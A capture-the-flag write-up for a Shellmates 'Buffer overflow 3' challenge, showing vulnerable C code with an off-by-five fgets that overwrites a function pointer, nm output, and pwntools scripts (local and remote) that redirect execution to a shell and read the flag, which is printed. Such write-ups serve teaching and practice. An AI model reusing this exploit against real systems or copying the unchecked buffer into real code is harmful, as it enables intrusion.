# Buffer overflow 3 

## Description

> This time I won't give it to you, you have to get it by yourself

## Write-Up

The given `C` code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
     
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    exit(0);
}
     
void mate() {
    printf("Hey Mate ! How u Doin ?!\n");
    exit(0);
}
     
int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    int var;
    void (*func)()=mate;
    char buf[128];
    printf("> ");
    fgets(buf,133,stdin);
    printf("Func adress  : %x\n",func );
    func();
    return 0;
}
```

This time, the things are a little bit different from the [Buffer overflow 2](../Buffer_overflow_2/solution.md) Challenge. This time, instead of injecting `0xdeadbeef` as a value in the `check` variable, we need to overwride the `func` pointer to point to the `shell()` function instead of the `mate()` function :

```c
...
     void (*func)()=mate;
    char buf[128];
    printf("> ");
    fgets(buf,133,stdin);
    printf("Func adress  : %x\n",func );
    func();
...
```

We will use the same approach and scripts as the previous challenge, but instead of `0xdeadbeef`, we will put the `shell()` address in the code instead. To retreive is, we use the `nm` command :

```
└─$ nm chall
080481cc r __abi_tag
0804c038 B __bss_start
0804c038 b completed.0
0804c030 D __data_start
0804c030 W data_start
08049120 t deregister_tm_clones
08049100 T _dl_relocate_static_pie
080491a0 t __do_global_dtors_aux
0804bf04 d __do_global_dtors_aux_fini_array_entry
0804c034 D __dso_handle
0804bf08 d _DYNAMIC
0804c038 D _edata
0804c03c B _end
         U exit@GLIBC_2.0
         U fgets@GLIBC_2.0
08049378 T _fini
0804a000 R _fp_hw
080491d0 t frame_dummy
0804bf00 d __frame_dummy_init_array_entry
0804a1f8 r __FRAME_END__
         U geteuid@GLIBC_2.0
0804c000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a044 r __GNU_EH_FRAME_HDR
08049000 T _init
0804bf04 d __init_array_end
0804bf00 d __init_array_start
0804a004 R _IO_stdin_used
08049370 T __libc_csu_fini
08049310 T __libc_csu_init
         U __libc_start_main@GLIBC_2.0
08049249 T main
0804921b T mate
         U printf@GLIBC_2.0
         U puts@GLIBC_2.0
08049160 t register_tm_clones
         U setbuf@GLIBC_2.0
         U setreuid@GLIBC_2.0
080491d6 T shell
080490c0 T _start
         U stderr@GLIBC_2.0
         U stdin@GLIBC_2.0
         U stdout@GLIBC_2.0
         U system@GLIBC_2.0
0804c038 D __TMC_END__
08049371 T __x86.get_pc_thunk.bp
08049110 T __x86.get_pc_thunk.bx
```

Note that the function address is `0x080491d6` :

```
...
         U setbuf@GLIBC_2.0
         U setreuid@GLIBC_2.0
080491d6 T shell
080490c0 T _start
         U stderr@GLIBC_2.0
...
```

Of course, we need to be careful about the length of the `buf` variable we want to overflow so we create the payload witht the right length (`buf` length this time is `128` chars (bytes)) :

```
└─$ cyclic 128
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
```

So here is our local script :

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\xd6\x91\x04\x08')

p.interactive()
```

By executing it, we get :

```
[+] Starting local process './chall': pid 11640
[*] Switching to interactive mode
> Func adress  : 80491d6
$ whoami
rivench
$ ls
chall  chall.c    script_local.py  script.py  solution.md
$ exit
[*] Got EOF while reading in interactive
$ exit
```

As for the remote :

```py
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1403'

p = remote(HOST, PORT)

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\xd6\x91\x04\x08')

p.interactive()
```

```
[+] Opening connection to pwn.challs.ctf.shellmates.club on port 1403: Done
[*] Switching to interactive mode
> Func adress  : 80491d6
$ whoami
nobody
$ ls
chall
entrypoint.sh
flag.txt
$ cat flag.txt
shellmates{Ov3r1ting_IP_FTW$$_7327394}
$ exit
```

**Note :** Always try your scripts locally before jumping to the remote, it will help you debug properly your code.

## Flag

shellmates{Ov3r1ting_IP_FTW$$_7327394}